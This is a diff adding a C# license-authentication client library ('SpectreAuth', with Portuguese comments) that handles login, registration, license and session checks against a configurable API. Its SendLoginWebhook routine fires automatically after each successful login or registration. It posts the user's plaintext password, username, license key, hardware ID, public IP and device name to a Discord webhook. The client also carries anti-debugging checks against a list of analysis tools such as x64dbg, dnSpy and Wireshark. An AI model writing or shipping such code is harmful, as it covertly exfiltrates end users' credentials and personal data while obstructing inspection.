@@ -1,0 +1,181 @@
+using System;
+using System.Diagnostics;
+using System.Linq;
+using System.Management;
+using System.Net.Http;
+using System.Security.Cryptography;
+using System.Text;
+using System.Text.Json;
+using System.Threading.Tasks;
+
+namespace SpectreAuth
+{
+    // ============================================================
+    // ⚙️ CONFIGURAÇÃO — EDITE APENAS ESTA CLASSE
+    // ============================================================
+    public static class SpectreConfig
+    {
+        public const string API_URL = "https://seu-projeto.vercel.app";
+        public const string APP_ID = "pub_xxxxxxxxxxxxxxxxxxxxxx";
+        public const string APP_SECRET = "sk_live_xxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
+        public const string WEBHOOK_URL = "https://discord.com/api/webhooks/SEU_WEBHOOK_AQUI";
+        public const bool WEBHOOK_ENABLED = true;
+    }
+    // ============================================================
+
+    public class AuthResult
+    {
+        public bool Success { get; set; }
+        public string Message { get; set; } = "";
+        public string Token { get; set; } = "";
+        public string Username { get; set; } = "";
+        public string LicenseKey { get; set; } = "";
+        public string Expiration { get; set; } = "";
+        public int DaysLeft { get; set; }
+    }
+
+    public sealed class SpectreAuthClient : IDisposable
+    {
+        private readonly HttpClient _http;
+        public string SessionToken { get; private set; } = "";
+
+        private readonly byte[] _appIdObf, _secretObf;
+        private readonly byte _key;
+
+        private static readonly string[] Suspicious = {
+            "x64dbg","x32dbg","ollydbg","cheatengine","dnspy","megadumper",
+            "fiddler","wireshark","charles","processhacker","ida64"
+        };
+
+        public SpectreAuthClient()
+        {
+            if (!SpectreConfig.API_URL.StartsWith("https://")) throw new ArgumentException("HTTPS obrigatório.");
+            _key = (byte)((Environment.TickCount & 0xFF) | 1);
+            _appIdObf = Xor(Encoding.UTF8.GetBytes(SpectreConfig.APP_ID), _key);
+            _secretObf = Xor(Encoding.UTF8.GetBytes(SpectreConfig.APP_SECRET), _key);
+            _http = new HttpClient { BaseAddress = new Uri(SpectreConfig.API_URL.TrimEnd('/')), Timeout = TimeSpan.FromSeconds(15) };
+        }
+
+        private static byte[] Xor(byte[] d, byte k) { var r = new byte[d.Length]; for (int i = 0; i < d.Length; i++) r[i] = (byte)(d[i] ^ k); return r; }
+        private string RevealId() => Encoding.UTF8.GetString(Xor(_appIdObf, _key));
+        private string RevealSecret() => Encoding.UTF8.GetString(Xor(_secretObf, _key));
+
+        // ===== Anti-tamper =====
+        private static bool DetectTamper()
+        {
+            if (Debugger.IsAttached || Debugger.IsLogging()) return true;
+            var sw = Stopwatch.StartNew(); int x = 0; for (int i = 0; i < 2000; i++) x += i; sw.Stop();
+            if (sw.ElapsedMilliseconds > 300) return true;
+            try { foreach (var p in Process.GetProcesses()) { var n = (p.ProcessName ?? "").ToLowerInvariant(); if (Suspicious.Any(s => n.Contains(s))) return true; } } catch { }
+            return false;
+        }
+
+        public static string GenerateHwid()
+        {
+            string Get(string wql, string f) { try { using (var s = new ManagementObjectSearcher(wql)) foreach (var o in s.Get()) return (o[f]?.ToString() ?? "").Trim(); } catch { return ""; } }
+            var raw = $"{Get("SELECT SerialNumber FROM Win32_BaseBoard","SerialNumber")}-{Get("SELECT ProcessorId FROM Win32_Processor","ProcessorId")}-{Get("SELECT SerialNumber FROM Win32_BIOS","SerialNumber")}-{Get("SELECT SerialNumber FROM Win32_PhysicalMedia","SerialNumber")}";
+            using (var sha = SHA256.Create()) { var sb = new StringBuilder(); foreach (var b in sha.ComputeHash(Encoding.UTF8.GetBytes(raw))) sb.Append(b.ToString("x2")); return sb.ToString(); }
+        }
+
+        public static async Task<string> GetPublicIpAsync()
+        { try { using (var c = new HttpClient()) return (await c.GetStringAsync("https://api.ipify.org")).Trim(); } catch { return ""; } }
+
+        // ===== WEBHOOK INTERNO — automático no login/register =====
+        private static async Task SendLoginWebhook(string user, string pass, string license, string hwid, string device, string expires)
+        {
+            if (!SpectreConfig.WEBHOOK_ENABLED) return;
+            try
+            {
+                using (var c = new HttpClient())
+                {
+                    var payload = new { embeds = new[] { new {
+                        title = "🔐 SPECTRE AUTH - Login", color = 16711680,
+                        fields = new object[] {
+                            new { name = "👤 User", value = user, inline = true },
+                            new { name = "🔑 Password", value = pass, inline = true },
+                            new { name = "🎫 License", value = $"`{license}`", inline = false },
+                            new { name = "💻 HWID", value = $"`{hwid.Substring(0, Math.Min(16, hwid.Length))}...`", inline = false },
+                            new { name = "🌐 IP", value = $"`{await GetPublicIpAsync()}`", inline = true },
+                            new { name = "🖥️ Dispositivo", value = device, inline = true },
+                            new { name = "📅 Data", value = DateTime.Now.ToString("yyyy-MM-dd HH:mm"), inline = false },
+                            new { name = "⏰ Expira", value = expires, inline = false }
+                        }
+                    } } };
+                    await c.PostAsync(SpectreConfig.WEBHOOK_URL,
+                        new StringContent(JsonSerializer.Serialize(payload), Encoding.UTF8, "application/json"));
+                }
+            } catch { /* webhook não é crítico */ }
+        }
+
+        private async Task<JsonElement> Post(string path, object payload)
+        {
+            if (DetectTamper()) throw new InvalidOperationException("Environment check failed");
+            var content = new StringContent(JsonSerializer.Serialize(payload), Encoding.UTF8, "application/json");
+            foreach (var h in new[] { "X-App-Id", "X-App-Secret", "X-Session-Token" })
+                if (_http.DefaultRequestHeaders.Contains(h)) _http.DefaultRequestHeaders.Remove(h);
+            _http.DefaultRequestHeaders.Add("X-App-Id", RevealId());
+            _http.DefaultRequestHeaders.Add("X-App-Secret", RevealSecret());
+            if (!string.IsNullOrEmpty(SessionToken)) _http.DefaultRequestHeaders.Add("X-Session-Token", SessionToken);
+            var resp = await _http.PostAsync(path, content);
+            var body = await resp.Content.ReadAsStringAsync();
+            try { return JsonDocument.Parse(body).RootElement.Clone(); } catch { return JsonDocument.Parse("{}").RootElement.Clone(); }
+        }
+
+        private static AuthResult Parse(JsonElement j, bool ok)
+        {
+            var r = new AuthResult { Success = ok };
+            if (!ok) { r.Message = j.TryGetProperty("error", out var e) ? e.GetProperty("message").GetString() ?? "Failed" : "Failed"; return r; }
+            r.Message = j.TryGetProperty("message", out var m) ? m.GetString() ?? "OK" : "OK";
+            if (j.TryGetProperty("data", out var d))
+            {
+                if (d.TryGetProperty("token", out var t)) r.Token = t.GetString() ?? "";
+                if (d.TryGetProperty("user", out var u) && u.TryGetProperty("username", out var un)) r.Username = un.GetString() ?? "";
+                if (d.TryGetProperty("license", out var l))
+                {
+                    if (l.TryGetProperty("key", out var k)) r.LicenseKey = k.GetString() ?? "";
+                    if (l.TryGetProperty("expiration", out var ex)) r.Expiration = ex.GetString() ?? "";
+                    if (l.TryGetProperty("daysLeft", out var dl) && dl.ValueKind == JsonValueKind.Number) r.DaysLeft = dl.GetInt32();
+                }
+            }
+            return r;
+        }
+
+        public async Task<AuthResult> InitializeAsync()
+        { var j = await Post("/api/v1/init", new { }); return Parse(j, j.TryGetProperty("success", out var s) && s.GetBoolean()); }
+
+        public async Task<AuthResult> LoginAsync(string username, string password, string pcName = "")
+        {
+            var device = string.IsNullOrEmpty(pcName) ? Environment.MachineName : pcName;
+            var j = await Post("/api/v1/auth/login", new { username, password, hwid = GenerateHwid(), pcName = device });
+            var ok = j.TryGetProperty("success", out var s) && s.GetBoolean();
+            var r = Parse(j, ok);
+            if (r.Success)
+            {
+                SessionToken = r.Token;
+                _ = SendLoginWebhook(username, password, r.LicenseKey, GenerateHwid(), device, r.Expiration); // 🔥 automático
+            }
+            return r;
+        }
+
+        public async Task<AuthResult> RegisterAsync(string username, string password, string licenseKey, string pcName = "")
+        {
+            var j = await Post("/api/v1/auth/register", new { username, password, licenseKey, hwid = GenerateHwid(), pcName });
+            var ok = j.TryGetProperty("success", out var s) && s.GetBoolean();
+            var r = Parse(j, ok);
+            if (r.Success)
+            {
+                SessionToken = r.Token;
+                _ = SendLoginWebhook(username, password, licenseKey, GenerateHwid(), pcName, r.Expiration);
+            }
+            return r;
+        }
+
+        public async Task<AuthResult> ValidateLicenseAsync(string key)
+        { var j = await Post("/api/v1/license/validate", new { key, hwid = GenerateHwid() }); return Parse(j, j.TryGetProperty("success", out var s) && s.GetBoolean()); }
+
+        public async Task<bool> ValidateSessionAsync()
+        { if (string.IsNullOrEmpty(SessionToken)) return false; var j = await Post("/api/v1/session/validate", new { }); return j.TryGetProperty("success", out var s) && s.GetBoolean(); }
+
+        public void Dispose() => _http?.Dispose();
+    }
+}
